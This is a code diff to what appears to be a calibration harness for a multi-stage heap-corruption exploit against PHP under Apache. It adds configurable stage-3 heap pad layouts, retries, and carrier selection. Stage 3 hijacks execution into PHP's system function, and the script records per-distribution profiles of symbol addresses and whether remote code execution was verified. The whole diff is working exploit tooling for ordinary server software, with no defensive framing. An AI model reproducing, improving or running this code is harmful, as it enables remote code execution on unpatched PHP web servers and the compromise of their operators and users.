@@ -267,38 +267,98 @@ def calibrate_stage2(mod, ex, dtor, hints):
     return 0, hints.get("stage2_t", 0)
 
 
+def parse_pads(spec):
+    """Accepts bookworm | lab | an explicit pads spec like '4:4x5,31:31x6'."""
+    if spec is None or spec in ("bookworm", "lab"):
+        return spec
+    pads = []
+    for part in spec.split(","):
+        m = re.fullmatch(r"(\d+):(\d+)(?:x(\d+))?", part.strip())
+        if not m:
+            raise SystemExit(f"bad --stage3-pads item: {part!r} (expected a:bxN)")
+        pads += [(int(m[1]), int(m[2]))] * int(m[3] or 1)
+    return pads
+
+
+def stage3_profile_json(stage3):
+    """(stage3_pads, stage3_carrier) pair for the profile JSON."""
+    if not stage3:
+        return None, None
+    pads = stage3["pads"]
+    if pads == "lab":
+        return [[8, 7]] + [[7, 7]] * 5, False
+    if isinstance(pads, list):
+        return [list(p) for p in pads], bool(stage3.get("carrier"))
+    return [[31, 31]] * 6, True
+
+
+def stage3_carrier_for(pads, override):
+    """Whether this layout uses the upstream 15-byte carrier.
+
+    Explicit pads are calibrated with the non-carrier branch by default: that
+    is the only branch where the per-build fake-reference knobs apply.  Pass
+    --stage3-carrier carrier to measure the carrier layout instead.
+    """
+    if override == "carrier":
+        return True
+    if override == "lab":
+        return False
+    if pads == "lab":
+        return False
+    return not isinstance(pads, list)
+
+
 def calibrate_stage3(mod, ex, chunk, lib, zif, proof, hints):
     if not chunk or not lib:
         return False, None
+    attempts = max(1, int(hints.get("stage3_attempts") or 5))
+    pads_arg = hints.get("stage3_pads")
+    explicit = None
+    if pads_arg not in (None, "bookworm", "lab"):
+        explicit = parse_pads(pads_arg)
     layouts = []
     if hints.get("stage3_htdata"):
-        layouts.append(("hint", hints["stage3_htdata"], hints.get("stage3_pads", "bookworm")))
+        layouts.append(("hint", hints["stage3_htdata"],
+                        explicit if explicit is not None else (pads_arg or "bookworm")))
+    elif explicit is not None:
+        # An explicit pads spec is useful on its own: try it with every known
+        # htdata slot instead of silently falling back to the built-in pairs.
+        for off in (0x690D8, 0x6E0D8, 0x5404A):
+            layouts.append((f"{hex(off)}/explicit", off, explicit))
     else:
         for off in (0x690D8, 0x6E0D8, 0x5404A):
             for pads in ("bookworm", "lab"):
                 layouts.append((f"{hex(off)}/{pads}", off, pads))
     for name, off, pads in layouts:
-        try:
-            if os.path.exists(proof):
-                os.unlink(proof)
-        except OSError:
-            pass
-        if pads == "lab":
-            ex.stage3_carrier = False
-            ex.stage3_pads = [(8, 7)] + [(7, 7)] * 5
-        else:
-            ex.stage3_carrier = True
-            ex.stage3_pads = [(31, 31)] * 6
-        try:
-            ex.rotate()
-            ex.stage3(chunk + off, lib + zif)
-        except Exception as exc:
-            print(f"    stage3 {name}: {exc}")
-        if os.path.exists(proof) and os.path.getsize(proof) > 0:
-            with open(proof) as handle:
-                print(f"[+] stage3 {name}: {handle.read().strip()}")
-            return True, {"htdata": off, "pads": pads}
-        print(f"    stage3 {name}: no proof")
+        carrier = stage3_carrier_for(pads, hints.get("stage3_carrier"))
+        for attempt in range(1, attempts + 1):
+            try:
+                if os.path.exists(proof):
+                    os.unlink(proof)
+            except OSError:
+                pass
+            if pads == "lab":
+                ex.stage3_pads = [(8, 7)] + [(7, 7)] * 5
+            elif isinstance(pads, list):
+                ex.stage3_pads = pads
+            else:
+                ex.stage3_pads = [(31, 31)] * 6
+            ex.stage3_carrier = carrier
+            try:
+                # A fresh worker restores the deterministic heap before every
+                # attempt (upstream rotates the same way in its retry loop).
+                ex.rotate()
+                ex.stage3(chunk + off, lib + zif)
+            except Exception as exc:
+                print(f"    stage3 {name} try {attempt}/{attempts}: {exc}")
+            if os.path.exists(proof) and os.path.getsize(proof) > 0:
+                with open(proof) as handle:
+                    print(f"[+] stage3 {name} try {attempt}/{attempts}: "
+                          f"{handle.read().strip()}")
+                return True, {"htdata": off, "pads": pads,
+                              "carrier": carrier}
+            if attempts > 1:
+                print(f"    stage3 {name} try {attempt}/{attempts}: no proof")
     return False, None
 
 
@@ -324,7 +384,13 @@ def main() -> int:
     ap.add_argument("--stage2-t", type=int)
     ap.add_argument("--stage2-v", type=int, default=16)
     ap.add_argument("--stage3-htdata", type=lambda x: int(x, 0))
-    ap.add_argument("--stage3-pads", choices=("bookworm", "lab"))
+    ap.add_argument("--stage3-pads", default=None,
+                    help='bookworm, lab, or explicit pads spec: "4:4x5,31:31x6"')
+    ap.add_argument("--stage3-carrier", choices=("auto", "carrier", "lab"),
+                    default="auto",
+                    help="stage-3 branch: carrier (15-byte upstream string), "
+                         "lab (fake-reference carriers), or auto (carrier for "
+                         "bookworm, lab for explicit/lab pads)")
     ap.add_argument("--distro", default="unknown")
     ap.add_argument("--arch", choices=("aarch64", "amd64"), default=None)
     args = ap.parse_args()
@@ -370,6 +436,7 @@ def main() -> int:
     rce, stage3 = calibrate_stage3(mod, ex, chunk, lib, sym["zif_system"],
                                    args.proof_file, vars(args))
 
+    s3_pads, s3_carrier = stage3_profile_json(stage3)
     profile = {
         "name": f"php-{version}-{args.distro}",
         "php_version": version,
@@ -377,11 +444,15 @@ def main() -> int:
         "fixed_in": f"{branch}.{fixed}" if fixed else None,
         "sapi": "apache2handler",
         "arch": arch,
-        "distro": "debian" if "bookworm" in args.distro else args.distro,
+        "distro": ("debian" if any(x in args.distro for x in
+                                   ("bookworm", "bullseye", "buster", "trixie",
+                                    "deb13", "debian"))
+                   else args.distro),
         "verified": rce,
         "rce": rce,
         "oom_mb": 12,
-        "upstream_profile": "bookworm",
+        "upstream_profile": ("bookworm" if s3_carrier in (None, True)
+                             else "lab"),
         "libphp": {
             "zif_system": hex(sym["zif_system"]),
             "zval_ptr_dtor": hex(sym["zval_ptr_dtor"]),
@@ -392,9 +463,8 @@ def main() -> int:
             "stage1_forge_len": forge_len,
             "stage2_t": t_index,
             "stage2_v": args.stage2_v,
-            "stage3_pads": ([[31, 31]] * 6 if stage3 and stage3["pads"] == "bookworm"
-                            else ([(8, 7)] + [(7, 7)] * 5 if stage3 else None)),
-            "stage3_carrier": (stage3["pads"] == "bookworm") if stage3 else None,
+            "stage3_pads": s3_pads,
+            "stage3_carrier": s3_carrier,
         },
         "config": cfg,
         "measured": {
